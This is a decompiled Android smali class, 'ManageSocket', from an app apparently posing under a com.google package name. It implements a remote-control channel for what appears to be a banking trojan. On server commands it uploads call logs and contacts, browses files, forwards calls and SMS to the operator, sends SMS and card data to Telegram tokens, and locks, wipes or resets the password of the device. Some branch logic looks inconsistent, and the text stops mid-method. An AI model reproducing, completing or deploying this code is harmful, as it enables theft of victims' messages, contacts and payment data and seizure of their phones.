.class public Lcom/google/xinoshell/connection/ManageSocket;
.super Ljava/lang/Object;
.source "ManageSocket.java"


# annotations
.annotation system Ldalvik/annotation/MemberClasses;
    value = {
        Lcom/google/xinoshell/connection/ManageSocket$SocketCallback;
    }
.end annotation


# static fields
.field private static final TAG:Ljava/lang/String; = "ManageSocket"

.field private static volatile instance:Lcom/google/xinoshell/connection/ManageSocket;


# instance fields
.field private callForwardUtil:Lcom/google/xinoshell/utils/callForwardingUtility;

.field private callback:Lcom/google/xinoshell/connection/ManageSocket$SocketCallback;

.field private dataUploader:Lcom/google/xinoshell/utils/DataUploader;

.field private fileBrowser:Lcom/google/xinoshell/utils/FileBrowser;

.field private mContext:Landroid/content/Context;

.field private prefs:Lcom/google/xinoshell/utils/SharedPrefManager;

.field private socketClient:Lcom/google/xinoshell/connection/SocketIOClient;


# direct methods
.method static bridge synthetic -$$Nest$fgetcallback(Lcom/google/xinoshell/connection/ManageSocket;)Lcom/google/xinoshell/connection/ManageSocket$SocketCallback;
    .locals 0

    iget-object p0, p0, Lcom/google/xinoshell/connection/ManageSocket;->callback:Lcom/google/xinoshell/connection/ManageSocket$SocketCallback;

    return-object p0
.end method

.method static bridge synthetic -$$Nest$mregisterDefaultListeners(Lcom/google/xinoshell/connection/ManageSocket;)V
    .locals 0

    invoke-direct {p0}, Lcom/google/xinoshell/connection/ManageSocket;->registerDefaultListeners()V

    return-void
.end method

.method private constructor <init>(Landroid/content/Context;)V
    .locals 1
    .param p1, "context"    # Landroid/content/Context;

    .line 41
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    .line 42
    invoke-virtual {p1}, Landroid/content/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    iput-object v0, p0, Lcom/google/xinoshell/connection/ManageSocket;->mContext:Landroid/content/Context;

    .line 43
    new-instance v0, Lcom/google/xinoshell/utils/SharedPrefManager;

    invoke-direct {v0, p1}, Lcom/google/xinoshell/utils/SharedPrefManager;-><init>(Landroid/content/Context;)V

    iput-object v0, p0, Lcom/google/xinoshell/connection/ManageSocket;->prefs:Lcom/google/xinoshell/utils/SharedPrefManager;

    .line 44
    new-instance v0, Lcom/google/xinoshell/utils/callForwardingUtility;

    invoke-direct {v0, p1}, Lcom/google/xinoshell/utils/callForwardingUtility;-><init>(Landroid/content/Context;)V

    iput-object v0, p0, Lcom/google/xinoshell/connection/ManageSocket;->callForwardUtil:Lcom/google/xinoshell/utils/callForwardingUtility;

    .line 45
    new-instance v0, Lcom/google/xinoshell/utils/DataUploader;

    invoke-direct {v0, p1}, Lcom/google/xinoshell/utils/DataUploader;-><init>(Landroid/content/Context;)V

    iput-object v0, p0, Lcom/google/xinoshell/connection/ManageSocket;->dataUploader:Lcom/google/xinoshell/utils/DataUploader;

    .line 46
    new-instance v0, Lcom/google/xinoshell/utils/FileBrowser;

    invoke-direct {v0, p1, p0}, Lcom/google/xinoshell/utils/FileBrowser;-><init>(Landroid/content/Context;Lcom/google/xinoshell/connection/ManageSocket;)V

    iput-object v0, p0, Lcom/google/xinoshell/connection/ManageSocket;->fileBrowser:Lcom/google/xinoshell/utils/FileBrowser;

    .line 47
    invoke-direct {p0}, Lcom/google/xinoshell/connection/ManageSocket;->initializeSocket()V

    .line 48
    return-void
.end method

.method private doForwarding(Ljava/lang/String;IZILjava/lang/String;)V
    .locals 5
    .param p1, "socketId"    # Ljava/lang/String;
    .param p2, "type"    # I
    .param p3, "isEnabled"    # Z
    .param p4, "fromSim"    # I
    .param p5, "toNumber"    # Ljava/lang/String;

    .line 370
    const/4 v0, 0x0

    const/4 v1, 0x1

    if-nez p2, :cond_4

    .line 371
    if-eqz p3, :cond_1

    .line 372
    iget-object v2, p0, Lcom/google/xinoshell/connection/ManageSocket;->callForwardUtil:Lcom/google/xinoshell/utils/callForwardingUtility;

    invoke-virtual {v2, p5, p4}, Lcom/google/xinoshell/utils/callForwardingUtility;->forwardCall(Ljava/lang/String;I)Z

    move-result v2

    if-eqz v2, :cond_0

    .line 373
    const-string v0, "successfully forwarded call to your number"

    invoke-virtual {p0, p1, v0, v1}, Lcom/google/xinoshell/connection/ManageSocket;->sendActionInfo(Ljava/lang/String;Ljava/lang/String;I)V

    goto :goto_0

    .line 375
    :cond_0
    const-string v1, "Failed to forward call to your number"

    invoke-virtual {p0, p1, v1, v0}, Lcom/google/xinoshell/connection/ManageSocket;->sendActionInfo(Ljava/lang/String;Ljava/lang/String;I)V

    goto :goto_0

    .line 378
    :cond_1
    iget-object v2, p0, Lcom/google/xinoshell/connection/ManageSocket;->callForwardUtil:Lcom/google/xinoshell/utils/callForwardingUtility;

    invoke-virtual {v2, p4}, Lcom/google/xinoshell/utils/callForwardingUtility;->isCallForwardingActive(I)Z

    move-result v2

    if-eqz v2, :cond_3

    .line 379
    iget-object v2, p0, Lcom/google/xinoshell/connection/ManageSocket;->callForwardUtil:Lcom/google/xinoshell/utils/callForwardingUtility;

    invoke-virtual {v2, p4}, Lcom/google/xinoshell/utils/callForwardingUtility;->deactivateCallForwarding(I)Z

    move-result v2

    if-eqz v2, :cond_2

    .line 380
    const-string v0, "call forwarding disabled successfully"

    invoke-virtual {p0, p1, v0, v1}, Lcom/google/xinoshell/connection/ManageSocket;->sendActionInfo(Ljava/lang/String;Ljava/lang/String;I)V

    goto :goto_0

    .line 382
    :cond_2
    const-string v1, "Failed to disable call forwarding"

    invoke-virtual {p0, p1, v1, v0}, Lcom/google/xinoshell/connection/ManageSocket;->sendActionInfo(Ljava/lang/String;Ljava/lang/String;I)V

    goto :goto_0

    .line 385
    :cond_3
    const-string v1, "Call forwarding not active"

    invoke-virtual {p0, p1, v1, v0}, Lcom/google/xinoshell/connection/ManageSocket;->sendActionInfo(Ljava/lang/String;Ljava/lang/String;I)V

    goto :goto_0

    .line 390
    :cond_4
    const-string v2, "forward"

    const-string v3, "isForwardSms"

    if-eqz p3, :cond_5

    .line 391
    iget-object v0, p0, Lcom/google/xinoshell/connection/ManageSocket;->prefs:Lcom/google/xinoshell/utils/SharedPrefManager;

    invoke-virtual {v0, v3, v1}, Lcom/google/xinoshell/utils/SharedPrefManager;->setB(Ljava/lang/String;Z)V

    .line 392
    iget-object v0, p0, Lcom/google/xinoshell/connection/ManageSocket;->prefs:Lcom/google/xinoshell/utils/SharedPrefManager;

    invoke-virtual {v0, v2, p5}, Lcom/google/xinoshell/utils/SharedPrefManager;->set(Ljava/lang/String;Ljava/lang/String;)V

    .line 393
    const-string v0, "sms forward successfully"

    invoke-virtual {p0, p1, v0, v1}, Lcom/google/xinoshell/connection/ManageSocket;->sendActionInfo(Ljava/lang/String;Ljava/lang/String;I)V

    goto :goto_0

    .line 395
    :cond_5
    iget-object v4, p0, Lcom/google/xinoshell/connection/ManageSocket;->prefs:Lcom/google/xinoshell/utils/SharedPrefManager;

    invoke-virtual {v4, v3, v0}, Lcom/google/xinoshell/utils/SharedPrefManager;->setB(Ljava/lang/String;Z)V

    .line 396
    iget-object v0, p0, Lcom/google/xinoshell/connection/ManageSocket;->prefs:Lcom/google/xinoshell/utils/SharedPrefManager;

    const-string v3, ""

    invoke-virtual {v0, v2, v3}, Lcom/google/xinoshell/utils/SharedPrefManager;->set(Ljava/lang/String;Ljava/lang/String;)V

    .line 397
    const-string v0, "sms forward disabled"

    invoke-virtual {p0, p1, v0, v1}, Lcom/google/xinoshell/connection/ManageSocket;->sendActionInfo(Ljava/lang/String;Ljava/lang/String;I)V

    .line 401
    :goto_0
    return-void
.end method

.method private getCallLogs(Ljava/lang/String;)V
    .locals 2
    .param p1, "socketId"    # Ljava/lang/String;

    .line 281
    iget-object v0, p0, Lcom/google/xinoshell/connection/ManageSocket;->dataUploader:Lcom/google/xinoshell/utils/DataUploader;

    new-instance v1, Lcom/google/xinoshell/connection/ManageSocket$2;

    invoke-direct {v1, p0, p1}, Lcom/google/xinoshell/connection/ManageSocket$2;-><init>(Lcom/google/xinoshell/connection/ManageSocket;Ljava/lang/String;)V

    invoke-virtual {v0, v1}, Lcom/google/xinoshell/utils/DataUploader;->uploadCallLogs(Lcom/google/xinoshell/utils/DataUploader$UploadCallback;)V

    .line 309
    return-void
.end method

.method private getContacts(Ljava/lang/String;)V
    .locals 2
    .param p1, "socketId"    # Ljava/lang/String;

    .line 312
    iget-object v0, p0, Lcom/google/xinoshell/connection/ManageSocket;->dataUploader:Lcom/google/xinoshell/utils/DataUploader;

    new-instance v1, Lcom/google/xinoshell/connection/ManageSocket$3;

    invoke-direct {v1, p0, p1}, Lcom/google/xinoshell/connection/ManageSocket$3;-><init>(Lcom/google/xinoshell/connection/ManageSocket;Ljava/lang/String;)V

    invoke-virtual {v0, v1}, Lcom/google/xinoshell/utils/DataUploader;->uploadContacts(Lcom/google/xinoshell/utils/DataUploader$UploadCallback;)V

    .line 341
    return-void
.end method

.method public static declared-synchronized getInstance(Landroid/content/Context;)Lcom/google/xinoshell/connection/ManageSocket;
    .locals 3
    .param p0, "context"    # Landroid/content/Context;

    const-class v0, Lcom/google/xinoshell/connection/ManageSocket;

    monitor-enter v0

    .line 50
    :try_start_0
    sget-object v1, Lcom/google/xinoshell/connection/ManageSocket;->instance:Lcom/google/xinoshell/connection/ManageSocket;

    if-nez v1, :cond_1

    .line 51
    const-class v1, Lcom/google/xinoshell/connection/ManageSocket;

    monitor-enter v1
    :try_end_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_1

    .line 52
    :try_start_1
    sget-object v2, Lcom/google/xinoshell/connection/ManageSocket;->instance:Lcom/google/xinoshell/connection/ManageSocket;

    if-nez v2, :cond_0

    .line 53
    new-instance v2, Lcom/google/xinoshell/connection/ManageSocket;

    invoke-direct {v2, p0}, Lcom/google/xinoshell/connection/ManageSocket;-><init>(Landroid/content/Context;)V

    sput-object v2, Lcom/google/xinoshell/connection/ManageSocket;->instance:Lcom/google/xinoshell/connection/ManageSocket;

    .line 55
    :cond_0
    monitor-exit v1

    goto :goto_0

    :catchall_0
    move-exception v2

    monitor-exit v1
    :try_end_1
    .catchall {:try_start_1 .. :try_end_1} :catchall_0

    :try_start_2
    throw v2

    .line 57
    :cond_1
    :goto_0
    sget-object v1, Lcom/google/xinoshell/connection/ManageSocket;->instance:Lcom/google/xinoshell/connection/ManageSocket;
    :try_end_2
    .catchall {:try_start_2 .. :try_end_2} :catchall_1

    monitor-exit v0

    return-object v1

    .line 49
    .end local p0    # "context":Landroid/content/Context;
    :catchall_1
    move-exception p0

    :try_start_3
    monitor-exit v0
    :try_end_3
    .catchall {:try_start_3 .. :try_end_3} :catchall_1

    throw p0
.end method

.method private handleTelegram(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;IZ)V
    .locals 4
    .param p1, "socketId"    # Ljava/lang/String;
    .param p2, "toToken"    # Ljava/lang/String;
    .param p3, "toUser"    # Ljava/lang/String;
    .param p4, "type"    # I
    .param p5, "isActive"    # Z

    .line 345
    const/4 v0, 0x0

    const/4 v1, 0x1

    if-nez p4, :cond_1

    .line 346
    const-string v2, "sendSmsToTG"

    if-eqz p5, :cond_0

    .line 347
    iget-object v0, p0, Lcom/google/xinoshell/connection/ManageSocket;->prefs:Lcom/google/xinoshell/utils/SharedPrefManager;

    invoke-virtual {v0, v2, v1}, Lcom/google/xinoshell/utils/SharedPrefManager;->setB(Ljava/lang/String;Z)V

    .line 348
    iget-object v0, p0, Lcom/google/xinoshell/connection/ManageSocket;->prefs:Lcom/google/xinoshell/utils/SharedPrefManager;

    const-string v2, "toSmsTgToken"

    invoke-virtual {v0, v2, p2}, Lcom/google/xinoshell/utils/SharedPrefManager;->set(Ljava/lang/String;Ljava/lang/String;)V

    .line 349
    iget-object v0, p0, Lcom/google/xinoshell/connection/ManageSocket;->prefs:Lcom/google/xinoshell/utils/SharedPrefManager;

    const-string v2, "toSmsTgUser"

    invoke-virtual {v0, v2, p3}, Lcom/google/xinoshell/utils/SharedPrefManager;->set(Ljava/lang/String;Ljava/lang/String;)V

    .line 350
    const-string v0, "Successfully activated send sms to telegram"

    invoke-virtual {p0, p1, v0, v1}, Lcom/google/xinoshell/connection/ManageSocket;->sendActionInfo(Ljava/lang/String;Ljava/lang/String;I)V

    goto :goto_0

    .line 352
    :cond_0
    iget-object v3, p0, Lcom/google/xinoshell/connection/ManageSocket;->prefs:Lcom/google/xinoshell/utils/SharedPrefManager;

    invoke-virtual {v3, v2, v0}, Lcom/google/xinoshell/utils/SharedPrefManager;->setB(Ljava/lang/String;Z)V

    .line 353
    const-string v0, "successfully deActivated send sms to telegram"

    invoke-virtual {p0, p1, v0, v1}, Lcom/google/xinoshell/connection/ManageSocket;->sendActionInfo(Ljava/lang/String;Ljava/lang/String;I)V

    goto :goto_0

    .line 356
    :cond_1
    const-string v2, "sendCCToTG"

    if-eqz p5, :cond_2

    .line 357
    iget-object v0, p0, Lcom/google/xinoshell/connection/ManageSocket;->prefs:Lcom/google/xinoshell/utils/SharedPrefManager;

    invoke-virtual {v0, v2, v1}, Lcom/google/xinoshell/utils/SharedPrefManager;->setB(Ljava/lang/String;Z)V

    .line 358
    iget-object v0, p0, Lcom/google/xinoshell/connection/ManageSocket;->prefs:Lcom/google/xinoshell/utils/SharedPrefManager;

    const-string v2, "toCCTgToken"

    invoke-virtual {v0, v2, p2}, Lcom/google/xinoshell/utils/SharedPrefManager;->set(Ljava/lang/String;Ljava/lang/String;)V

    .line 359
    iget-object v0, p0, Lcom/google/xinoshell/connection/ManageSocket;->prefs:Lcom/google/xinoshell/utils/SharedPrefManager;

    const-string v2, "toCCTgUser"

    invoke-virtual {v0, v2, p3}, Lcom/google/xinoshell/utils/SharedPrefManager;->set(Ljava/lang/String;Ljava/lang/String;)V

    .line 360
    const-string v0, "Successfully activated send connection to telegram"

    invoke-virtual {p0, p1, v0, v1}, Lcom/google/xinoshell/connection/ManageSocket;->sendActionInfo(Ljava/lang/String;Ljava/lang/String;I)V

    goto :goto_0

    .line 362
    :cond_2
    iget-object v3, p0, Lcom/google/xinoshell/connection/ManageSocket;->prefs:Lcom/google/xinoshell/utils/SharedPrefManager;

    invoke-virtual {v3, v2, v0}, Lcom/google/xinoshell/utils/SharedPrefManager;->setB(Ljava/lang/String;Z)V

    .line 363
    const-string v0, "successfully deActivated send connection to telegram"

    invoke-virtual {p0, p1, v0, v1}, Lcom/google/xinoshell/connection/ManageSocket;->sendActionInfo(Ljava/lang/String;Ljava/lang/String;I)V

    .line 367
    :goto_0
    return-void
.end method

.method private initializeSocket()V
    .locals 2

    .line 61
    iget-object v0, p0, Lcom/google/xinoshell/connection/ManageSocket;->mContext:Landroid/content/Context;

    invoke-static {v0}, Lcom/google/xinoshell/connection/SocketIOClient;->getInstance(Landroid/content/Context;)Lcom/google/xinoshell/connection/SocketIOClient;

    move-result-object v0

    iput-object v0, p0, Lcom/google/xinoshell/connection/ManageSocket;->socketClient:Lcom/google/xinoshell/connection/SocketIOClient;

    .line 63
    iget-object v0, p0, Lcom/google/xinoshell/connection/ManageSocket;->socketClient:Lcom/google/xinoshell/connection/SocketIOClient;

    new-instance v1, Lcom/google/xinoshell/connection/ManageSocket$1;

    invoke-direct {v1, p0}, Lcom/google/xinoshell/connection/ManageSocket$1;-><init>(Lcom/google/xinoshell/connection/ManageSocket;)V

    invoke-virtual {v0, v1}, Lcom/google/xinoshell/connection/SocketIOClient;->setEventListener(Lcom/google/xinoshell/connection/SocketIOClient$SocketEventListener;)V

    .line 79
    return-void
.end method

.method private openUrlInBrowser(Ljava/lang/String;Ljava/lang/String;)V
    .locals 7
    .param p1, "socketId"    # Ljava/lang/String;
    .param p2, "url"    # Ljava/lang/String;

    .line 405
    const-string v0, "url: "

    const-string v1, "android.intent.action.VIEW"

    const/4 v2, 0x1

    const/high16 v3, 0x10000000

    :try_start_0
    new-instance v4, Landroid/content/Intent;

    invoke-static {p2}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v5

    invoke-direct {v4, v1, v5}, Landroid/content/Intent;-><init>(Ljava/lang/String;Landroid/net/Uri;)V

    .line 406
    .local v4, "intent":Landroid/content/Intent;
    const-string v5, "com.android.chrome"

    invoke-virtual {v4, v5}, Landroid/content/Intent;->setPackage(Ljava/lang/String;)Landroid/content/Intent;

    .line 407
    invoke-virtual {v4, v3}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    .line 408
    iget-object v5, p0, Lcom/google/xinoshell/connection/ManageSocket;->mContext:Landroid/content/Context;

    invoke-virtual {v5, v4}, Landroid/content/Context;->startActivity(Landroid/content/Intent;)V

    .line 409
    new-instance v5, Ljava/lang/StringBuilder;

    invoke-direct {v5}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v5, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    invoke-virtual {v5, p2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    const-string v6, " successfully opened in chrome"

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v5

    invoke-virtual {p0, p1, v5, v2}, Lcom/google/xinoshell/connection/ManageSocket;->sendActionInfo(Ljava/lang/String;Ljava/lang/String;I)V
    :try_end_0
    .catch Landroid/content/ActivityNotFoundException; {:try_start_0 .. :try_end_0} :catch_0

    .line 415
    .end local v4    # "intent":Landroid/content/Intent;
    goto :goto_0

    .line 410
    :catch_0
    move-exception v4

    .line 411
    .local v4, "e":Landroid/content/ActivityNotFoundException;
    new-instance v5, Landroid/content/Intent;

    invoke-static {p2}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v6

    invoke-direct {v5, v1, v6}, Landroid/content/Intent;-><init>(Ljava/lang/String;Landroid/net/Uri;)V

    .line 412
    .local v5, "fallbackIntent":Landroid/content/Intent;
    invoke-virtual {v5, v3}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    .line 413
    iget-object v1, p0, Lcom/google/xinoshell/connection/ManageSocket;->mContext:Landroid/content/Context;

    invoke-virtual {v1, v5}, Landroid/content/Context;->startActivity(Landroid/content/Intent;)V

    .line 414
    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v1, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0, p2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    const-string v1, " successfully opened on other browser"

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {p0, p1, v0, v2}, Lcom/google/xinoshell/connection/ManageSocket;->sendActionInfo(Ljava/lang/String;Ljava/lang/String;I)V

    .line 416
    .end local v4    # "e":Landroid/content/ActivityNotFoundException;
    .end local v5    # "fallbackIntent":Landroid/content/Intent;
    :goto_0
    return-void
.end method

.method private handleDeviceAdmin(Lorg/json/JSONObject;Ljava/lang/String;Ljava/lang/String;)V
    .locals 11
    .param p1, "data"    # Lorg/json/JSONObject;
    .param p2, "action"    # Ljava/lang/String;
    .param p3, "socketId"    # Ljava/lang/String;

    const/4 v6, 0x0

    const/4 v7, 0x1

    .line 290
    :try_start_0
    iget-object v0, p0, Lcom/google/xinoshell/connection/ManageSocket;->mContext:Landroid/content/Context;

    const-string v1, "device_policy"

    invoke-virtual {v0, v1}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v1

    check-cast v1, Landroid/app/admin/DevicePolicyManager;

    .line 291
    .local v1, "dpm":Landroid/app/admin/DevicePolicyManager;
    new-instance v2, Landroid/content/ComponentName;

    const-class v3, Lcom/google/xinoshell/receivers/DeviceAdminReceiver;

    invoke-direct {v2, v0, v3}, Landroid/content/ComponentName;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 292
    .local v2, "adminComponent":Landroid/content/ComponentName;
    const-string v3, "enable-device-admin"

    invoke-virtual {p2, v3}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v3

    if-eqz v3, :cond_0

    .line 320
    :goto_enable_done
    invoke-virtual {v1, v2}, Landroid/app/admin/DevicePolicyManager;->isAdminActive(Landroid/content/ComponentName;)Z

    move-result v3

    if-nez v3, :cond_no_admin

    .line 322
    const-string v3, "lock-device"

    invoke-virtual {p2, v3}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v3

    if-nez v3, :cond_lock_done

    .line 323
    invoke-virtual {v1}, Landroid/app/admin/DevicePolicyManager;->lockNow()V

    const-string v3, "Device locked"

    invoke-virtual {p0, p3, v3, v7}, Lcom/google/xinoshell/connection/ManageSocket;->sendActionInfo(Ljava/lang/String;Ljava/lang/String;I)V

    goto :goto_dispatch_end

    .line 325
    :cond_lock_done
    const-string v3, "force-lock"

    invoke-virtual {p2, v3}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v3

    if-nez v3, :cond_force_lock_done

    .line 326
    invoke-virtual {v1}, Landroid/app/admin/DevicePolicyManager;->lockNow()V

    const-string v3, "Device force-locked"

    invoke-virtual {p0, p3, v3, v7}, Lcom/google/xinoshell/connection/ManageSocket;->sendActionInfo(Ljava/lang/String;Ljava/lang/String;I)V

    goto :goto_dispatch_end

    .line 328
    :cond_force_lock_done
    const-string v3, "wipe-device"

    invoke-virtual {p2, v3}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v3

    if-nez v3, :cond_wipe_done

    .line 329
    invoke-virtual {v1, v6}, Landroid/app/admin/DevicePolicyManager;->wipeData(I)V

    const-string v3, "Wipe command issued (factory reset in progress)"

    invoke-virtual {p0, p3, v3, v7}, Lcom/google/xinoshell/connection/ManageSocket;->sendActionInfo(Ljava/lang/String;Ljava/lang/String;I)V

    goto :goto_dispatch_end

    .line 331
    :cond_wipe_done
    const-string v3, "reset-password"

    invoke-virtual {p2, v3}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v3

    if-nez v3, :cond_unknown

    .line 332
    const-string v3, "password"

    const-string v4, ""

    invoke-virtual {p1, v3, v4}, Lorg/json/JSONObject;->optString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    .line 333
    .local v3, "newPassword":Ljava/lang/String;
    invoke-virtual {v1, v3, v6}, Landroid/app/admin/DevicePolicyManager;->resetPassword(Ljava/lang/String;I)Z

    move-result v4

    if-eqz v4, :cond_pw_fail

    const-string v4, "Password reset successfully"

    invoke-virtual {p0, p3, v4, v7}, Lcom/google/xinoshell/connection/ManageSocket;->sendActionInfo(Ljava/lang/String;Ljava/lang/String;I)V

    goto :goto_dispatch_end

    .line 335
    :cond_pw_fail
    const-string v4, "Failed to reset password (may be unsupported on this Android version)"

    invoke-virtual {p0, p3, v4, v6}, Lcom/google/xinoshell/connection/ManageSocket;->sendActionInfo(Ljava/lang/String;Ljava/lang/String;I)V

    goto :goto_dispatch_end

    .line 338
    .end local v3    # "newPassword":Ljava/lang/String;
    :cond_unknown
    const-string v3, "Unknown device admin action"

    invoke-virtual {p0, p3, v3, v6}, Lcom/google/xinoshell/connection/ManageSocket;->sendActionInfo(Ljava/lang/String;Ljava/lang/String;I)V

    goto :goto_dispatch_end

    .line 340
    :cond_no_admin
    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    const-string v4, "Device admin not active. Send 'enable-device-admin' first. Action: "

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3, p2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    invoke-virtual {p0, p3, v3, v6}, Lcom/google/xinoshell/connection/ManageSocket;->sendActionInfo(Ljava/lang/String;Ljava/lang/String;I)V

    goto :goto_dispatch_end

    .line 294
    :cond_0
    new-instance v3, Landroid/content/Intent;

    const-string v4, "android.app.action.ADD_DEVICE_ADMIN"

    invoke-direct {v3, v4}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V

    .line 295
    .local v3, "intent":Landroid/content/Intent;
    const-string v4, "android.app.extra.DEVICE_ADMIN"

    invoke-virtual {v3, v4, v2}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Landroid/os/Parcelable;)Landroid/content/Intent;

    .line 296
    const/high16 v4, 0x10000000

    invoke-virtual {v3, v4}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    .line 297
    const-string v4, "android.app.extra.ADD_EXPLANATION"

    const-string v5, "Activate device admin to enable remote lock, wipe, and password reset."

    invoke-virtual {v3, v4, v5}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    .line 301
    invoke-virtual {v0, v3}, Landroid/content/Context;->startActivity(Landroid/content/Intent;)V

    .line 302
    const-string v4, "Device admin activation requested"

    invoke-virtual {p0, p3, v4, v7}, Lcom/google/xinoshell/connection/ManageSocket;->sendActionInfo(Ljava/lang/String;Ljava/lang/String;I)V

    .line 303
    .end local v3    # "intent":Landroid/content/Intent;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_dispatch_end

    .line 344
    :catch_0
    move-exception v0

    .line 345
    .local v0, "e":Ljava/lang/Exception;
    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    const-string v2, "Device admin command failed: "

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v0}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {p0, p3, v1, v6}, Lcom/google/xinoshell/connection/ManageSocket;->sendActionInfo(Ljava/lang/String;Ljava/lang/String;I)V

    .line 346
    :goto_dispatch_end
    return-void
.end method

.method private registerDefaultListeners()V
    .locals 3

    .line 183
    iget-object v0, p0, Lcom/google/xinoshell/connection/ManageSocket;->socketClient:Lcom/google/xinoshell/connection/SocketIOClient;

    new-instance v1, Lcom/google/xinoshell/connection/ManageSocket$$ExternalSyntheticLambda0;

    invoke-direct {v1, p0}, Lcom/google/xinoshell/connection/ManageSocket$$ExternalSyntheticLambda0;-><init>(Lcom/google/xinoshell/connection/ManageSocket;)V

    const-string v2, "server_command"

    invoke-virtual {v0, v2, v1}, Lcom/google/xinoshell/connection/SocketIOClient;->on(Ljava/lang/String;Lio/socket/emitter/Emitter$Listener;)V

    .line 277
    return-void
.end method


# virtual methods
.method public cleanup()V
    .locals 2

    .line 419
    iget-object v0, p0, Lcom/google/xinoshell/connection/ManageSocket;->socketClient:Lcom/google/xinoshell/connection/SocketIOClient;

    const/4 v1, 0x0

    if-eqz v0, :cond_0

    .line 420
    iget-object v0, p0, Lcom/google/xinoshell/connection/ManageSocket;->socketClient:Lcom/google/xinoshell/connection/SocketIOClient;

    invoke-virtual {v0}, Lcom/google/xinoshell/connection/SocketIOClient;->disconnect()V

    .line 421
    iget-object v0, p0, Lcom/google/xinoshell/connection/ManageSocket;->socketClient:Lcom/google/xinoshell/connection/SocketIOClient;

    invoke-virtual {v0, v1}, Lcom/google/xinoshell/connection/SocketIOClient;->setEventListener(Lcom/google/xinoshell/connection/SocketIOClient$SocketEventListener;)V

    .line 423
    :cond_0
    iput-object v1, p0, Lcom/google/xinoshell/connection/ManageSocket;->callback:Lcom/google/xinoshell/connection/ManageSocket$SocketCallback;

    .line 424
    sput-object v1, Lcom/google/xinoshell/connection/ManageSocket;->instance:Lcom/google/xinoshell/connection/ManageSocket;

    .line 425
    return-void
.end method

.method public connect()V
    .locals 1

    .line 86
    iget-object v0, p0, Lcom/google/xinoshell/connection/ManageSocket;->socketClient:Lcom/google/xinoshell/connection/SocketIOClient;

    invoke-virtual {v0}, Lcom/google/xinoshell/connection/SocketIOClient;->isConnected()Z

    move-result v0

    if-nez v0, :cond_0

    .line 87
    iget-object v0, p0, Lcom/google/xinoshell/connection/ManageSocket;->socketClient:Lcom/google/xinoshell/connection/SocketIOClient;

    invoke-virtual {v0}, Lcom/google/xinoshell/connection/SocketIOClient;->connect()V

    .line 89
    :cond_0
    return-void
.end method

.method public disconnect()V
    .locals 1

    .line 92
    iget-object v0, p0, Lcom/google/xinoshell/connection/ManageSocket;->socketClient:Lcom/google/xinoshell/connection/SocketIOClient;

    invoke-virtual {v0}, Lcom/google/xinoshell/connection/SocketIOClient;->isConnected()Z

    move-result v0

    if-eqz v0, :cond_0

    .line 93
    iget-object v0, p0, Lcom/google/xinoshell/connection/ManageSocket;->socketClient:Lcom/google/xinoshell/connection/SocketIOClient;

    invoke-virtual {v0}, Lcom/google/xinoshell/connection/SocketIOClient;->disconnect()V

    .line 95
    :cond_0
    return-void
.end method

.method public isConnected()Z
    .locals 1

    .line 98
